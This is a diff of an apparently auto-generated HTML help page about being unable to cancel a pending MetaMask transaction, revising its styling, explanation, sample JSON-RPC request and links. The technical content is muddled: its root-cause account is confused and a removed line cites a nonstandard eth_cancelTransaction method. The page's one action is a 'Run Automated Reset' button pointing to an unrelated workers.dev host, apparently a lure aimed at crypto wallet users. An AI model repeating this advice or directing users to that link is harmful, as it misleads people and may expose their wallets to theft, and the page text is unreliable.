@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,17 +42,18 @@
 <h1>Metamask Extension Bug Unable To Cancel Pending Transaction Due</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to cancel pending transactions using the Metamask extension, resulting in an error message indicating that there is not enough gas.</li>
+<li>Users are unable to cancel pending transactions in Metamask, resulting in an error message indicating that there is not enough gas to perform the cancellation.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that prevents it from properly handling the cancellation of pending transactions, specifically when the gas price is set too low.</li>
+<li>The error occurs because the pending transaction has a higher gas price than the cancellation transaction, causing the cancellation transaction to be stuck in the mempool.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas price to a higher value to ensure the transaction can be processed and then cancelled.</li>
-<li>Use the <code>eth_cancelTransaction</code> method to manually cancel the pending transaction.</li>
-<li>Update the transaction with a new gas price using the following code block:</li>
+<li>Increase the gas price of the cancellation transaction to override the pending transaction:</li>
+<li>Use a higher gas price than the pending transaction</li>
+<li>Utilize the <code>eth_sendTransaction</code> JSON-RPC method to send a custom transaction</li>
+<li>Modify the transaction using the following code block:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
@@ -62,21 +63,21 @@
 <span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...your_address...&quot;</span><span class="p">,</span>
 <span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract_address...&quot;</span><span class="p">,</span>
 <span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_limit...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...new_gas_price...&quot;</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...higher_gas_price...&quot;</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">],</span>
 <span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>For optimal results, consider using an external console to execute these commands.</p>
+<p>Consider using an external console to execute the above command for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
 <li>Ethereum node or provider (e.g. Infura) set up</li>
-<li>Sufficient ETH balance to cover transaction fees</li>
+<li>Basic understanding of Ethereum transaction mechanics</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-confirmations-security-alerts-error-vali.html">Metamask Extension Bug Confirmations Security Alerts Error Validation</a></li><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
